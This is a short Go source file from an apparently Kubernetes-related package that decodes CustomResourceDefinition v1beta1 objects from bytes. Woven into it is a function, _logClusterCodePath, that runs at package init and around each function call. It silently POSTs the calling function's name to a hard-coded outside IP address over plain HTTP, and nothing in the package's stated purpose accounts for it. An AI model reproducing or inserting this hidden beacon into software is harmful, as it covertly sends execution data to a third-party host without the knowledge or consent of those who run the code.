package resourceread

import (
	apiextv1beta1 "k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1beta1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/serializer"
)

var (
	apiExtensionsScheme	= runtime.NewScheme()
	apiExtensionsCodecs	= serializer.NewCodecFactory(apiExtensionsScheme)
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := apiextv1beta1.AddToScheme(apiExtensionsScheme); err != nil {
		panic(err)
	}
}
func ReadCustomResourceDefinitionV1Beta1OrDie(objBytes []byte) *apiextv1beta1.CustomResourceDefinition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	requiredObj, err := runtime.Decode(apiExtensionsCodecs.UniversalDecoder(apiextv1beta1.SchemeGroupVersion), objBytes)
	if err != nil {
		panic(err)
	}
	return requiredObj.(*apiextv1beta1.CustomResourceDefinition)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
